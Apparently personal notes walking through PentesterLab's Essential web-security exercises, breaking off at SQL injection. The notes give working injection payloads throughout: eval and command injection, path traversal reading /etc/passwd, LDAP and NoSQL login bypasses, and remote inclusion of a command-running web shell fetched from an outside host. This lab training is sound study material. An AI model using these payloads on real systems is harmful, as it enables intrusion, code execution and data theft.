## Essential Badge
Note: Authentication challenges denoted as AuthN,
Authorization challenges denoted as AuthZ
### Essential 01// AuthN 01
[Challenge URL](https://pentesterlab.com/exercises/authe_01/course)

We're kicking off with cookie-tampering. Our goal is to modify the cookie returned by the server when we login as `user1` so that we can login as the `admin` user. 

To start, we need to register a regular user that won't have any admin permissions. Once we've got a new user registered, we can examine the request headers, and we'll see a line `Cookie: auth=user33`.

If we log out, then log back in (with firefox set ZAP's local proxy via foxyproxy) with "break on every request" set in ZAP, on the server's response, we'll again see the `Cookie: auth=admin` line in the response headers. If we change this line mid-request to `Cookie: auth=admin`, the server will log us in and start a new session as the `admin` user.

### Essential 02// AuthN 02
[Challenge URL](https://pentesterlab.com/exercises/authe_02/course)

Similar to the previous challenge, we're attempting to tamper with the user cookie and get a valid session as the `admin` user. Registering a new `user12` (this username is arbitrary), we again see a line in the headers `Cookie: auth=d781eaae8248db6ce1a7b82e58e60435`. This should indicate the auth mechanism is functionally the same as the previous challenge, however the cookie-ID is being obfuscated. 

If we drop the hash into [CyberChef](https://gchq.github.io/CyberChef/) and use the `Analyze Hash` option, we get the following output;
```
Based on the length, this hash could have been generated by one of the following hashing functions:
MD5
MD4
MD2
HAVAL-128
RIPEMD-128
Snefru
Tiger-128
```
This indicates that some combination of our username and password is being used as our cookie to determine our user's permissions. The most likely algorithm being used above is MD5. If we go back to cyberChef, and run the string `admin` through an MD5 hash, we get the hash `21232f297a57a5a743894a0e4a801fc3`. If we again set ZAP to break on every request and try to login again as our new user, we can change the `Set-Cookie:` line to `Set-Cookie: auth=21232f297a57a5a743894a0e4a801fc3`, and the server will log us in as the `admin` user.

### Essential 03// AuthN 03
[Challenge URL](https://pentesterlab.com/exercises/authe_03/course)

Here we're exploiting a flaw in how (some) `MySQL` databases do character comparisons. If the DB is using the `VARCHAR` type, the comparison is *not* case-sensitive, i.e., newuser and NEWUSER are seen as equivalent and equal.
The application for this challenge first checks to see if a user already exists in the database when registering, then upon login verifies the user and pass combo are correct. However, any further access to the application is handled by checking the username that is saved for the session. If we create a new user with a username like `ADmin`, the application will register that the same as the actual `admin` user.

To complete the challenge, register a new user with some upper and lower-case combo of letters of `admin`, i.e. `AdMin`, then log back into the application and you'll be treated as the `admin` user.

### Essential 04// AuthN 04
[Challenge URL](https://pentesterlab.com/exercises/authe_04/course)

This challenge is exploiting a different flaw in how `MySQL` performs string-comparisons. Trailing spaces in entries are ignored, therefor, `username` and `username  ` (two spaces at the end) are equivalent. To complete the challenge, register a user with the name `admin   ` (some number of spaces at the end of the username).

### Essential 05// AuthN 05
[Challenge URL](https://pentesterlab.com/exercises/authe_05/course)

Here we're told there's an issue related to how a user gets redirected back to the login screen for the application, and to inspect the responses from the server to find the flaw. The application presented to us is only a login screen, there's no option to register a new user.

If we send the requests through ZAP, we see that the application first goes to the index/root page at 'libcurl.so/' before redirecting to the 'libcurl.so/login.php' page. However, the initial GET request to the index processes as though we had already successfully logged in before sending the second GET request to redirect back to the login page. Because the server is behaving on the initial request as though we had a valid user session, we can see the key in the response to the first GET request, without ever actually logging in, or even attempting to login to the application.

### Essential 06// AuthZ 01
[Challenge URL](https://pentesterlab.com/exercises/autho_01/course)

This challenge, we're told to login with the given creds. We're met with a page of "confidential" information. Looking at the URL's of the two "confidential" links, we see a very predictable naming scheme, `/info/1` and `/info/2`. If we increment the value to `/info/3` at the end of the URL, we can access information from another user because the server performs no further checks on the requests once we have a valid user session. `/info/3` and `/info/4` will reveal the key to the challenge, it seems any higher numbers lead to a very nicely formatted and informative error page. These pages however are not a part of this challenge. 

### Essential 07// AuthZ 02
[Challenge URL](https://pentesterlab.com/exercises/autho_02/course)

We're given another basic web app with creds to login as `user1` to access our "confidential" info, this time we also have the option of editing the pages that contain said info. However this time, if we attempt to directly go to `/infos/3`, we get redirected to the login page. But, the redirect did not get applied to the `edit` page. So if we go from one of our documents, and change the URL to `/infos/edit/3`, we get access to `user2`'s documents, and thus the key for this challenge.

### Essential 08// AuthZ 03
[Challenge URL](https://pentesterlab.com/exercises/autho_03/course)

This challenge we're exploiting a common flaw in a RAILS application of mishandling data that is available in multiple formats. If we click the `show` link to `/users/1`, we get an `HTML` page/doc showing a masked/hidden challenge key. But, all of the info on this page is also available as a `json` doc, if we just append `.json` to the end of the URL, we'll be taken to a `json` page that has the key in plaintext.

### Essential 09// AuthZ 04
[Challenge URL](https://pentesterlab.com/exercises/autho_04/course)

Here we're exploiting a lack of protections assigned to a `@user` object in a `ruby` app database. Instead of directly interacting with an SQL database, many sites use `Object-Relational Mapping` (ORM) to query and interact with the database, allowing the use of objects like `@user = User.Create(userHash)` and `@user.update_attributes(newHash)`. 

In this application, there's two privilege levels, user and admin. However, there aren't any proper checks on how the `admin` attribute gets assigned to a user. We'll start by registering a new user, and capturing every request through ZAP.

If we look at the parameters being sent for our new user request, we get a URL-encoded version of `user[username]=NewUser`. To register our new user as an admin, we need to append the proper parameter to our request while it's in flight. If we add `user%5Badmin%5D=true&` before the `submit` section of the request payload, so the entire request payload is `user%5Busername%5D=onemore&user%5Bpassword%5D=password&user%5Badmin%5D=true&submit=Submit+Query`, our new user will be registered with admin privileges, and we'll get the key to this exercise. 

### Essential 10// AuthZ 05
[Challenge URL](https://pentesterlab.com/exercises/autho_05/course)

This challenge we're told the dev fixed the bug that allowed us to directly register our user as an admin, but that it's still possible to gain admin privilege indirectly. After registering a new user, we're brought to an "Update your details" page that sends a request with an updated username and password to `/update_profile`. This time, using `user[admin]=true` fails to update our user to an admin. However, `true` isn't the only value in javascript that evaluates to, well, `true`, though it does appear to be the only value that the developer blocked us from. If we intercept the `/update_profile` request, and append `&user[admin]=1` to the end of the request payload, the server interprets it as `true` and allows us to update our user to an admin.

### Essential 11// AuthZ 06
[Challenge URL](https://pentesterlab.com/exercises/autho_06/course)

Here our goal is to get our user registered as part of an organisation. In ruby apps, a common way of organizing users is using the `ActiveRecord` data-mapper function, which by convention uses an `Organisation` class with multiple `User` objects within, managed by an `organisation_id` assigned per-user to determine which users belongs where. Ruby-on-Rails enforces *convention* over *configuration*, as a result, some objects become easy to guess. Our goal is to join *Organisation #1*, which most likely has id of `oganisation_1`.

The webapp we're presented with has a user registration field, and a list of organisations, *Company #1* and *Company #2*. In order to join *Company/Org #1*, we can intercept the new user request with ZAP, and append `&user[organisation_id]=1` to the end of the `/signup` POST request payload. This will add our new user to org#1, and successfully complete the challenge.

### Essential 12// Code Execution 01
[Challenge URL](https://pentesterlab.com/exercises/codexec_01/course)

This challenge our goal is goal is code execution on a `PHP` app. Code exec is possible due to a lack of filtering or improper escaping of certain characters on sections of an application that take user-input. We can use special characters (depending on the underlying application tech) to break out of the code statement that our user input is wrapped in, and trick the server into running our chosen commands as part of its execution of the original code.

Typically, we'll also want to add a comment-char to the end of our code statement to prevent the server from running the rest of the developers intended code, which gives us more control over how the server behaves/responds. Because this is a `PHP` app, we can use `//` for our comment-char.

In order to test for code-exec, we can add comment-chars to our user-input with a random value, use string concatenation (joining two strings together), track the timing of a command using `sleep` commands, or other options depending on the underlying app.

The application for this challenge takes a value from the URL, `name=$VALUE`, and returns the string "Hello $VALUE!!!" to the page. There's no payload associated with the request, just a GET request to the `libcurl.so/name=VALUE`. However, this gives us full control over what value the server tries to return.

If we try sending a single quote `'`, the app returns normally, but if we use a double-quote `"`, we get a very informative error message;
```php
# Parse error: syntax error, unexpected '!', expecting ',' or ';' in **/var/www/index.php(16) : eval()'d code** on line 1
```
showing the `php` app is using the `eval()` statement to read in user-input from the URL and return it to the page. If we use `"."getw"."rekt"."`, the server returns `getwrekt` without the quotes or period, showing the concatenation of the two strings successfully. To test an actual command, we can use `".system('uname -a')";//`, the `;//` at the end is the end-of-line/command char for (`;`) and a comment-char (`//`) to prevent the remainder of the dev's code statement from executing. Using the `system()` function allows our `php` code to use commands installed on the underlying server.

In order to complete the challenge, we're using the PTL `/usr/local/bin/score` command instead of finding a key, the full URL will be `hxxps://ptl-instanceID.libcurl.so/?name=%22.system(%27/usr/local/bin/score%20unique-user-id-here%27);//`

### Essential 13// Code Execution 02
[Challenge URL](https://pentesterlab.com/exercises/codexec_02/course)

Here, we're again attempting to gain code exec on an underlying `php` program. However, the function our code will be in is different and slightly more complicated. In the url, we have `libcurl.so/?order=id`. If throw in a single-quote `'` at the end of the URL, the table on our page is still returned, but we get an error message and a warn message at the top of the page;
```php
Parse error: syntax error, unexpected '',$b->id'' (T_CONSTANT_ENCAPSED_STRING) in /var/www/index.php(29) : runtime-created function on line 1
  
Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/index.php on line 29
```
An error will prevent our code from executing, but a warn will still allow (at least some of it) to be processed and executed. The error indicates our single-quote broke the function's syntax, and that it's also using the `usort()` function to sort the items in the table.

We're given the source-code of the function, and can see that our user input `.so/?order=INPUTHERE` will be evaluated inside a set of curly-braces `{}`. To get our syntax correct, we'll first test putting in a comment char to see if we can still get the webpage to return normally. Using `/?order=id;}//` returns another parse-error, but if we add a closing parenthesis `)`, the server returns warnings about `strcmp()`, without any errors, showing we should be able to inject some code after the closing curly-brace `}` before the comment-char `//`.

For our code to run successfully, the exact value after `/?order=` is irrelevant, so long as the rest of our syntax is correct to break out of the function. For example, using `ibcurl.so/?order=lmaonothingmatters);}system('whoami');//` while returning about a dozen warnings and notices, still runs the `whoami` command and shows the application running as the `www-data` user.

Using `libcurl.so/?order=id);}system('pwd');//` returns `/var/www` above the warnings about `strcmp()`, showing our command is running successfully. To score the challenge, we'll use `libcurl.so?order=id);}system('/usr/local/bin/score unique-user-UUID-here');//`.

### Essential 14// Code Execution 03
[Challenge URL](https://pentesterlab.com/exercises/codexec_03/course)

We're again exploiting a somewhat unsafe `php` function modifier in the application. This time, the function modifier is `PCRE_REPLACE_EVAL (/e)`, though the application is still taking user-input from the URL; `libcurl.so/?new=hacker&pattern=/lamer/&base=Hello lamer`
The function is taking the `&base=` value, checking to see if any part of it matches the `&pattern=/ /` value, and if it does, replaces it with the `/?new=` value. So if our URL is `/libcurl.so/?new=bbq&pattern=/wtf/&base=lmaowtf`, the `preg_replace` function runs the regex-pattern `wtf` on our `&base=` value, and replaces the matching sections (`wtf`) with our `?/new=` value of `bbq`. Using the `PCRE_REPLACE_EVAL` modifier (`/e`), we can make the function evaluate our `?/new=` value as `php` code. Though note, as of `PHP 5.5.0`, this modifier has been deprecated. In order to use the modifier, we'll add it at the end of the `&pattern=` value, `&pattern=/lmao/e`, and we should get a notice about Use of undefined constant, showing the server tried to evaluate our `/?new=` value as a new constant instead of as a string. If we make the value `/?new=phpinfo()`, and successfully get a page returning information about the `PHP` installation, we know we have our own code executing on the server.

To score for this challenge, we'll set our `/?new=` value to `/?new=system('/usr/local/bin/score uniquie-user-UUID-here'`, the full URL being `libcurl.so/?new=system('/usr/local/bin/score unique-user-UUID-here')&pattern=/wtf/e&base=lmaowtf`. The `&pattern` and `&base` values here don't matter, so long as the `&pattern` value matches some portion of the `&base` value to exec our code using the `/e` modifier. If there's no match from `&pattern`, the rest of the function, and thus our code won't execute. 

### Essential 15// Code Execution 04
[Challenge URL](https://pentesterlab.com/exercises/codexec_04/course)

This challenge, we're exploiting the `php` function `assert`. If this function is implemented incorrectly, `php` will evaluate the value it receives, and if it's valid `php` code, execute it.

We again have user-input taken from the URL, `libcurl.so/?name=`, giving us control over the value of the `name` parameter. Using a double-quote, the server returns the value normally, but using a single-quote returns a syntax error in the `assert()` function, showing us the syntax being used to construct the string. If we use `php`'s string concatenation, `/?name=test'.'`, to close the string, the error disappears and the server returns the page normally. Using this, we can send the value `/?name=test'.phpinfo().'` to again return info about the underlying `php` installation. To score the challenge, we'll replace `'.phpinfo().'` with our `system('score')` command, `libcurl.so/?name=test'.system('/usr/local/bin/score unique-user-UUID-here'.'`.

### Essential 16// Code Execution 05
[Challenge URL](https://pentesterlab.com/exercises/codexec_05/course)

Time for not-completely-different. This challenge, if we throw a double-quote into the `?/username=` parameter, we get an error message showing a `ruby` application in development mode. It shows a syntax error in `eval`, in the specific line
```ruby
@message = eval "\"Hello "+params['username']+"\""
```
Which conveniently lays out the exact syntax we'll need to use to inject code into `eval()` using the `username` parameter. We'll need to URL-encode our payload in order to get it to run succesfully due to the required plus-signs `+` to concatenate our command into the `eval()` statement. ZAProxy has a built in Encoding/Decoding function under the `tools` tab. To test, we can use `libcurl.so/?username=test"%2B`uname`%2B"`, which should successfully return `hello testLinux`.

To score the challenge, we'll replace `uname` with our `/usr/local/bin/score UUID` command.

### Essential 17// Code Execution 06
[Challenge URL](https://pentesterlab.com/exercises/codexec_06/course)

This round we're exploiting a `python` app, and again the application is taking user input from the URL, `libcurl.so/hello/hacker`. A single-quote returns normally, but a double-quote returns an Internal Server Error, but without any specifics. If we try and inject anything where `hello` is in the URL, we get a page not found error, so the only portion we'll be tampering with after `libcurl.so/hello/`.

Throwing in a second double-quote `""` at the end of the URL resolves the error and returns normally. We can inject 
```python
`"%2bstr(True)%2b"test` 
```
and get a valid response page with "Hello `Truetest`!", which gives us a decent indication this is in fact a `python` application. If we throw a value *that python already interprets as a string* into the `str()` function, we get another internal server error, but using values like `False` or `int` (both `python` built-ins) gives us a valid return response. We'll be putting our payload inside the `str()` function for this challenge.

To verify we can get code exec, we'll start with `os.system('id)'`. Starting with the payload `libcurl.so/hello/"%2bstr(os.system('id'))%2b"`, we get a valid response showing "Hello `0`", which *is not the command output*, but rather the exit code of the command itself. `0` means the command finished successfully without error. If we put an invalid command inside of `os.system()`, we get `32512`, which supposedly indicates the process had an exit code of `127`. As far as I know, those two specific numbers aren't important, but what is, is the fact that neither are `0`, on most unix systems and programming languages, any return code other than `0` indicates some kind of error, and `0` indicates success.

If we want to get the actual output from the command instead of just the return code, we can use `os.popen('COMMANDHERE').read()` instead of `os.system()`. Using the `read()` function attached to `os.popen` will grab the command output from stdout and return it to the page.

Using `libcurl.so/hello/"%2bstr(os.popen('id').read())%2b"` will return
``` bash
Hello uid=1000(flask) gid=1000(flask) groups=1000(flask) !
```
Showing our commands are executing as the `flask` user. To finish the challenge, we'll replace `id` inside of the `os.popen()` call with our `/usr/local/score UUID` command. Because the `score` command marks the challenge as completed for us, and thus we aren't looking for a key to copy, we can use either `os.popen().read()` or `os.system()` to send the `score` command to the server. If using `os.system('/usr/local/score UUID')`, and the page returns `0`, the challenge should be marked as complete.

### Essential 18// Code Execution 07
[Challenge URL](https://pentesterlab.com/exercises/codexec_07/course)

Similar to the last challenge, we're again attacking a `python` application that takes user-input from the URL. In our last challenge, the `python os` module what already imported in the program for us. However this time, we'll have to import the module in our code injection before we can run any system commands. 

To get access to the `os` module, we'll use the `python __import__` statement, making our URL `libcurl.so/hello/"%2bstr(__import__('os').system('id'))%2b"`, which will again return the exit-code of our `id` command. We can again use the `popen()` function instead to get the actual output from the command, such as `libcurl.so/hello/"%2bstr(__import__('os').popen('id').read())%2b"`. To score the challenge, we'll switch the `id` command to `/usr/local/bin/score UUID`. 

### Essential 19// Code Execution 08
[Challenge URL](https://pentesterlab.com/exercises/codexec_08/course)

The difference between this challenge and the previous challenges is a slight tweak in how the underlying app is configured. Previously, flask was using `@app.route('/hello/'`, this challenge the app is housed on the server at `@app.route('/hello/user'`. While the change is minor, the lack of ending foward-slash `/` in the configuration will prevent us from running our `/usr/local/bin/score` command, as any payloads we send using a `/` return a page not found error. To get around this, we'll use `base64` to encode our entire payload, bypassing the character restriction, and a plain-text call to `python`'s `base64.decode()` function.

The `id` command isn't available this time, but we can use `libcurl.so/hello/"%2bstr(__import__('os').popen('pwd').read())%2b"` to get our initial syntax worked out. To verify our `base64` syntax is correct, we'll start with the `pwd` command. The entire `__import__('base64').b64decode('cHdk)` statement will take the place of `pwd` inside our original payload, making our full URL `libcurl.so/hello/libcurl.so/hello/"%2bstr(__import__('os').popen(__import__('base64').b64decode('cHdk')).read())%2b"`. This URL should return the output of the command `pwd`, showing we're in the `/srv` folder. To score the challenge, we'll change the command we `base64 encoded` from `pwd` to our `/usr/local/bin/score UUID` command. 

### Essential 20// Code Execution 09
[Challenge URL](https://pentesterlab.com/exercises/codexec_09/course)

This challenge, we're told the backend for the application is `perl`. If we inspect the requests the instance makes, we can see GET request to `libcurl.so/cgi-bin/hello?name=` after the index page is loaded. `CGI` (Common Gateway Interface) is a way to load a script via a web request. If we click the link on the index page, it returns 'hello hacker', with a `/#hacker` appended to the index URL. The poundsign `#` in this case is a special character that is used to tell the script in `cgi-bin` to use what comes after it as an input for the script.

Taking a closer look at the response from the request to `cgi-bin`, we see the response is `{"str":"Hello ourinput"`, using both single and double quotes causes the server to return an index page *without* the hello prompt. Sending a single-quote in our request causes the server to return an emtpy `str` value, `{"str":""}`. Using a double-quote gives us a syntax error, `SyntaxError: JSON.parse: expected ',' or '}'`, but the error is only obvious if we directly open the `cgi-bin` URL in our system browser from ZAP's request history. We'll have to use a string concatenation char in order to get our payload to execute properly, in this case a `.`. To make sure our syntax is correct, we can use `/hello?=test%27.%60uname%60.%27`. `%60` is a URL-encoded backtick. We could also use `system(CMDHERE)`, however we run into the issue of only getting the command exit code instead of the actual output of the command again.

In order to score this challenge, we'll keep the URL-encoded backticks, and substitute our `/usr/local/bin/score UUID` command for `uname` above to mark it as complete.

### Essential 21// Command Execution 01
[Challenge URL](https://pentesterlab.com/exercises/comexec_01/course)

This challenge we're given a webapp that directly runs the `bash ping` command, taking user-input from the URL as the `ip=` parameter. Due to a lack of input filtering, we can use special `bash` chars to make the program run a command of our choice. We can revisit the [introBadge#Intro 03]({% link notes/introBadge.md%}) for a quick overview of available chars.

For this challenge, if we want the actual output of our command, our best option is to use a semi-colon `;`, i.e. `ip=127.0.0.1 ; uname -a`, while the IP can be just about anything, sticking with pinging localhost gives the quickest result. 

### Essential 22// Command Execution 02
[Challengre URL](https://pentesterlab.com/exercises/comexec_02/course)

Here we're dealing with the same application, however the dev added in some input filtering, and if we attempt the same payload as the previous challenge, the server returns a page saying "Invalid IP address". However, we can still use a command wrapped in backticks added after the IP address. The server won't return the output of the command, but using `libcurl.so/?ip=127.0.0.1 `/usr/local/bin/score UUID` ` (with backticks around the score command), the challenge will still complete successfully.

### Essential 23// Command Execution 03
[Challenge URL](https://pentesterlab.com/exercises/comexec_03/course)

We're attacking the same `php ping` app again, this time we're told the dev fixed the previous issue (again) and is filterering more special characters, however not enough of them. We can use the `$(COMMAND)` syntax. Again due to limitations of `php`'s `system` call, we again won't get any actual output from our commands, but a lack of output does not always mean a lack of execution. If we use `libcurl.so/?ip=127.0.0.1 $(/usr/local/bin/score UUID)` the challenge will complete successfully.

### Essential 24// Directory Traversal 01
[Challenge URL](https://pentesterlab.com/exercises/dirtrav_01/course)

Here we're exploiting a lack of input filtering, but instead of injecting code our commands, we'll be traversing the filesystem to gain access to sensitive files, in this case the file `/pentesterlab.key`. We'll need to grab the link to the image on the page of the instance, and then begin by injecting `../` chars to move up a folder. For Linux systems, we can use as many copies of `../../../../../` as we care to type, if we have to many, it will automatically drop us into the root `/` directory.

NOTE: For applications that use code similar to the following to add an attribute to the file;
```php
$file = "/var/files/example_".$_GET['id'].".txt";
```
On linux, this would only be exploitable if a directory named `example_` exists, as the only part of the code we'd have control over is the `id` section. However, on Windows systems, we would still be able to exploit the directory traversal due to a quirk in how Windows processes file names, if the name of the directory we're attempting to access doesn't exist, we'll get dropped into the highest level directory.

To complete this challenge, we'll open the image in a new tab, and then change the URL to `libcurl.so/file.php?file=../../../../../../../pentesterlab.key`.

### Essential 25// Directory Traversal 02
[Challenge URL](https://pentesterlab.com/exercises/dirtrav_02/course)

This challenge is similar to the one above, however the file name is referenced by it's entire path, `/var/www/hacker.png`. If we tried to access `libcurl.so/file.php?file=../../../../etc/passwd` directly, we get a blank page. But, if we leave the initial `/var/www` in the URL, i.e. `libcurl.so/file.php?file=/var/www/../../../../../etc/passwd` we can successfully access the file. To complete the challenge, substitute `/etc/passwd` for `/pentesterlab.key`

### Essential 26// Directory Traversal 03
[Challenge URL](https://pentesterlab.com/exercises/dirtrav_03/course)

Here, the server is adding a suffix/file-extension to the URL, which would turn our request for `/file.php?file=../../../../etc/passwd` into `/file.php?file=../../../etc/passwd.png` or something similar.

To get around this, we can add a URL-encoded NULL-BYTE (`%00`) to drop everything that comes after it. If we change the URL to `/file.php?file=../../../../pentesterlab.key%00` we can successfully retrieve the key for this challenge

### Essential 27// File Include 01
[Challenge URL](https://pentesterlab.com/exercises/fileinc_01/course)

This challenge we're exploiting a File Include vuln in a `php` application. File Include vulns arise from a lack of filtering, particularly when user-controlled input is used as part of a file name in a call to a function that loads another resource. In `php`, `require, require_once, inlclude, and include_once` are common examples. This functions are used to load a either a file local to the server, or a file hosted remotely on another server, i.e. loading a common css or font file. If the input is not properly validated however, we can use these functions for directory traversal, or to load our own malicious scripts. 

By default, `php` disables loading remote files, but it's been enabled in this instance to demonstrate it. Starting from the challenge base URL, `libcurl.so/?page=intro.php`, if we put in a single-quote or double-quote, we get a very informative Warning about `include(intro.php")` not being found in `/var/www/index.php` and the `include_path='.:/usr/share/php:/usr/share/pear'`. This shows us the server is taking the filename from the `page=` parameter and searching for it somewhere in the `include_path`. We can change the URL to be `page=/etc/passwd`, and the page will return the contents of the local file.

To test for Remote File Inclusion, we're provided a short `php` script that returns the content of `phpinfo()` when ran. To do so, change the URL to `page=http://assets.pentesterlab.com/test_include.txt`, which would also allow us to load our own malicious script hosted just about anywhere. We're also given another script to allow us to execute arbitrary commands at using the URL `http://assets.pentesterlab.com/test_include_system.txt`, the contents of which are
```php
<?php 
  system($_GET['c']);
?>
```
By adding `&c=` to the end of the URL, we can specify the command for the script to run. Because the challenge instance is already using a question mark in `/?page=` to specify a parameter, we'll need to use the ampersand `&` for our commands.

To score the challenge using the provided script, we'll use a URL of `libcurl.so/?page=http://assets.pentesterlab.com/test_include_system.txt&c=/usr/local/bin/score UUID`

### Essential 28// File Include 02
[Challenge URL](https://pentesterlab.com/exercises/fileinc_02/course)

NOTE: The behavior in this challenge is only naturally present in older installations of `PHP`, and was patched in `PHP Ver 5.3.4`.

This challenge is very similar to the previous one, however this time the server is adding a prefix to the URL on the backend. Like with [EssentialBadge#Essential 26 Directory Traversal 03|Directory Traversal 03]({% link notes/EssentialBadge.md%}), we can use a URL-encoded NULL-byte (`%00`) for a *local* file inclusion (LFI), or for a *remote* file inclusion (RFI), we can add a dummy parameter to the end of the URL using `&lol=` or `?lmao=` depending on how our initial URL is structured. 

For an LFI demonstration, we could use the URL `libcurl.so/?page=/etc/passwd%00`, or any other locally available file.

For our RFI, and to score the challenge, we'll use a NULL-byte after our remote URL script, and put our commands after it, like `libcurl.so/?page=http://assets.pentesterlab.com/test_include_system.txt%00&c=id`. To score the challenge, replace the `id` command at the end of the URL with `/usr/local/bin/score UUID`.

### Essential 29// LDAP 01
[Challenge URL](https://pentesterlab.com/exercises/ldap_01/course)

This challenge, we're exploiting a flaw in configuration of an LDAP (Lightweight Directory Access Protocol) server. We're given a login page, with no option to register a new user for this challenge. Instead, we'll be bypassing the auth process by exploiting the fact that the server authorizes a NULL Bind. If we send `null` values instead of a username and password combo, the underlying `php` code interprets it incorrectly an authenticated user. While the login page is supposed to prevent this behavior, the LDAP server itself is still configured to allow NULL/anonymous connections. 

To exploit this, we'll inspect the request sent on a login attempt. We can see a `username=&password=` object in the request payload. Sending a blank user and pass combo won't authenticate us. However, if we edit the request in ZAP, completely remove the user/password object and send an empty/NULL request body/payload, we can see in the response the server authenticates us and gives us the key for this challenge. 

### Essential 30// LDAP 02
[Challenge URL](https://pentesterlab.com/exercises/ldap_02/course)

Here we're exploiting a flaw in LDAP's conditional processing. LDAP syntax takes input based on a conditional filter based on `(cn=[USERINPUT])`, often using boolean operators of OR (`|` char) or AND (`&` char). The syntax for these conditionals is to go before the input statement, i.e. `(|(cn=[INPUT1])(cn=[INPUT2]))` for *OR* to return values that match either input, and `(&(cn=[INPUT1])(userpassword=[INPUT2]))` for *AND*. We can also use a wildcard (`*`) to match *any* value, or any value matching a substring lke `adm*`.

To test this instances filtering/conditionals, we'll start with `hacker/hacker` as our name/password combo in the URL, which authenticates us normally. If we change it to `ha*/hacker`, it still authenticates us as the `hacker` user, as the wildcard will match all entries starting with `ha` and attempt to use the password `hacker` with it. However, if we try the same thing in the password field, i.e. `hacker/ha*`, auth fails, very likely indicating the password is being hashed on the server. From this, our auth logic probably looks similar to `(&(cn=[INPUT1])(userPassword=HASH[INPUT2]))`. Due to the likely hash on the password field, our injection is restricted to the `name` input. We'll again be using a NULL-byte (`%00`) at the end of our query to drop the remainder of the filter.

In order to bypass the authentication, we'll inject a `)` to close the current filter so it matches on the username only, use a conditional that always evaluates to TRUE, i.e. `(cn=*)`, another `)` to keep the syntax correct, and a NULL-byte at the end to drop the rest of the filter. All together, using the payload `?name=hacker)(cn=*))%00` will cause the webpage to return a notice about an undefined index, *however it will still authenticate us as the user Hacker.* From here, we can change the first `?name=` parameter to `admin` to authenticate as the `admin` user directly, or we could use `?name=a*`, which will cause the server to authenticate as the first user in the database who's username starts with the letter 'a', in this case also the `admin` user. Either way will allow you to retrieve the key for this challenge. 

### Essential 31// MongoDB Injection 01
[Challenge URL](https://pentesterlab.com/exercises/mongo_01/course)

This challenge we're exploiting a MongoDB instance using Mongo's NoSQL version of `' or 1=1 --`. MongoDB docs (and the challenge description) tells us `or 1=1` translates to `|| 1==1`, and we'll again be using a NULL-byte to terminate the rest of the query. In some cases, we may also be able to use comment chars of `//` or `<!--` for the same purpose.

Submitting a test login shows our username and password are getting appended to the URL to be `libcurl.so/?username=test&password=test&submit=Submit+Query`. Using a double-quote doesn't seem to affect the request, but a single-quote returns a syntax error. However this only occurs with the `username` parameter, not the `password` parameter, indicating the password is likely being hashed, and we'll have to use the `username` field for our injection.

In order to do so, we'll inject our query directly into the URL instead of the username form, and our full URL to retrieve the key for this challenge will be `libcurl.so/?username=admin' || 1==1 %00&password=test&submit=Submit+Query`. The user we use before the rest of our payload seems to be irrelevant, for instance using `libcurl.so/?username=test' || 1==1 %00&password=test&submit=Submit+Query` will still retrieve the key for this challenge. This is likely because the the `|| 1==1` returns true and authenticates the first user in the database, in this case likely `admin.`

### Essential 32// MongoDB Injection 02
[Challenge URL](https://pentesterlab.com/exercises/mongo_02/course)

Here our goal is to retrieve the password from the MongoDB for the `admin` user. The webapp we're presented with contains a list of four users, and following the links shows a URL in the form of `ibcurl.so/?search=test4`, with the `search=` parameter corresponding to a username.

It's a reasonable assumption that all of these users also have a password associated with them, and we can append queries for said passwords to our search using `&& this.password && this.password.match`. In the event that some entries in the NoSQL database *do not* have a password field, it's a best practice to use both `&& this.password && this.password.match` instead of `&& this.password.match` by itself. 

We can confirm this by searching for `?search=admin' %26%26 this.password.match(/.*/)%00`, which returns just the `admin` user in the list `?search=admin' %26%26 this.password.match(/zzzzz/)%00` to match entries with usename `admin` and password `zzzz`, we get a valid response, but with a blank list. Using `?search=admin' %26%26 this.passwordlmao.match(/.*/)%00`, we're told by the challenge description we'll get an error message, however I'm only getting an empty list.

Regardless, because we two different distinct states, one value returned on a match with valid regex, and no value returned with invalid regex, we can perform a blind injection. To do so, we'll automate the process of checking the password value with a script, for which I'm going to use `python`. 

![MongoDB Injection 02 Python Script]({% link notes/MongoDB-Injection-02-Python-Script.md%})

This script will (slowly, very slowly) check every possible character in the password one character at a time by checking to see if the `admin` object is returned with the characters in the password discovered via the wildcard regex so far. Once discovered, the script should print out the final matching password/key and terminate itself. This script differs slightly on the `CHARSET` line from the one shown in the PTL videos. Instead of using `string.ascii_lowercase`, which would iterate through the entire alphabet, I've switched it to a hardcoded string of `"abcdef"`, as these are the only letters used in PTL key (which we're told is `[0-9a-f]` in the challenge description.)

### Essential 33// Open Redirect 01
[Challenge URL](https://pentesterlab.com/exercises/openred_01/course)

Now we're working with an Open Redirect vulnerability. This allows us to craft a URL on a vulnerable website that will automatically redirect the user to a different URL that's under our control. Because I don't have my own infrastructure setup for this, we'll use the provided suggestion of `webhook.site`, which generates a temporary site with a UUID that will log and inspect any HTTP request sent to it. To trigger the redirect, we'll append `/redirect.php?uri=` to the end of the challenge URL, followed by `https://webhook.site/UUIDHERE`, so our full URL will be `libcurl.so/redirect.php?uri=https://webhook.site/UUIDHERE`. If it triggers in our `webhook.site`, we can use URL as the one we enter into the first box for this challenge. If we formed our URL correctly, we'll see the key for this challenge in the `user-agent` field of the headers for the redirected request in our `webhook.site` log.

### Essential 34// Open Redirect 02
[Challenge URL](https://pentesterlab.com/exercises/openred_02/course)

NOTE: Due to how `website.hook` handles HTTP -> HTTPS upgrades, always use the TLS HTTPS link for this challenge.

Very similar to the previous challenge, however this time the 'dev' of this instance coded the redirect to always begin with a forward slash `/`. While `/https:...` would not be interpreted as a valid URL, we can use another forward slash `//` to escape the one the dev hardcoded. The URL we'll use in the first box in this instance is `libcurl.so/redirect.php?uri=//webhook.site/5f973e80-c5f8-4ae6-bff4-e314e8cf3c83?`, if we leave the `https://` in our `webhook.site` URL, the challenge will attempt to send a GET request starting with `https://https://` and will fail. Once the redirected request is sent to our `webhook.site` instance, grab the key for the challenge from the `user-agent` field. 

### Essential 35// SQL Injection 01
[Challenge URL](https://pentesterlab.com/exercises/sqli_01/course)

NOTE: We're told all SQLi challenges use `MySQL` as the backend

SQL injections are a very common webapp vulnerability that arise from a lack of input filtering on user supplied input that gets processed as part of an SQL query. Information in an SQL statement can be echo'd back three different ways, using single/double-quotes, backticks, or directly. How the original statement is crafted will dictate how (or if) it can be broken out of.

Our goal is to bypass the login page. To do, so we'll need to successfully submit a query that always returns true, for which we can use `or 1=1 -- `, the ` -- ` (space, two hyphens, space) is used to terminate the remainder of the query on the server. 

Starting with injecting a single-quote (`'`) into the username field, we get a syntax error at the top of the page;
```MySQL
